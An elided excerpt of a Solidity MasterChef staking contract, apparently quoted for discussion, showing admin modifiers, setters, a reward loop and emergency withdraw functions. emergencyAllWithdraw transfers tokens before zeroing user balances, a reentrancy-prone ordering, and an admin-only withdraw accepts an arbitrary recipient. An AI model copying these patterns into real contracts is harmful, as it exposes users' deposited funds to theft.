...
contract MasterChef is Ownable {
     ...
     */
    modifier onlyAdmin() {
        require(_admins.contains(msg.sender), 'Ownable: caller is not the owner');
        _;
    }
    ...
    function setBitx(BEP20 _bitx) external onlyOwner {
        bitx = _bitx;
    }

    function setBusd(BEP20 _busd) external onlyOwner {
        busd = _busd;
    }

    function setBusdPerBlock(uint256 _busdPerBlock) external onlyOwner {
        busdPerBlock = _busdPerBlock;
    }
    ...
    function pendingAllBusd(address _user) external view returns (uint256) {
        ...
        for(uint i=1 ; i<poolInfo.length ; i++) {
            ...
            amount = amount.add(user.amount.mul(accBusdPerShare).div(1e12).sub(user.rewardDebt));
        }
        return amount;
    }
    ...
    function withdraw(uint256 _pid, uint256 _amount, address _to) external onlyAdmin {
    ...
    // All withdraw without caring about rewards. EMERGENCY ONLY.
    function emergencyAllWithdraw() public {

        for(uint i=1 ; i<poolInfo.length ; i++) {
            PoolInfo storage pool = poolInfo[i];
            UserInfo storage user = userInfo[i][msg.sender];
            pool.lpToken.safeTransfer(address(msg.sender), user.amount);
            emit EmergencyWithdraw(msg.sender, i, user.amount);
            user.amount = 0;
            user.rewardDebt = 0;
        }
    }

    // All harvest. EMERGENCY ONLY.
    function emergencyAllHarvest() public {
